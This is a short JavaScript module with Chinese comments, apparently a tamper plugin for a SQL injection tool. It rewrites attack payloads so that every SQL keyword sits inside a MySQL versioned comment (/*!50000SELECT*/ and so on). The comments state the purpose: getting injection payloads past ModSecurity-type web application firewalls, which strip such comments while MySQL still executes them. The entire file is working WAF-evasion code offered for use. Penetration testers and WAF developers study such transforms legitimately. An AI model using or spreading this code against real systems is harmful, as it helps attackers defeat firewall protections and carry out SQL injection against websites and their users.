// ModSecurity 绕过：用 /*!50000keyword*/ 版本化注释包裹每个关键字
// MySQL 5.0+ 会执行版本号 <= 当前版本的条件注释内的语法，WAF 按 /* */ 普通注释剥离 → 关键字逃逸
const KW =
  'SELECT|UNION|ALL|DISTINCT|FROM|WHERE|AND|ORDER|BY|GROUP|HAVING|LIMIT|OFFSET|INSERT|UPDATE|DELETE|INTO|VALUES|SET|DROP|CREATE|TABLE|DATABASE|VERSION|JOIN|ON|BETWEEN|LIKE|NULL|IS|IN|NOT|AS';
const RE = new RegExp(`\\b(${KW})\\b`, 'gi');

export const modsecurityversionedkeywords = {
  name: 'modsecurityversionedkeywords',
  description: '用 /*!50000keyword*/ 版本化注释包裹每个关键字（MySQL 5.0+ 执行注释内语法），绕过 ModSecurity 类 WAF',
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return payload.replace(RE, (m) => '/*!50000' + m + '*/');
  },
};

export default modsecurityversionedkeywords;
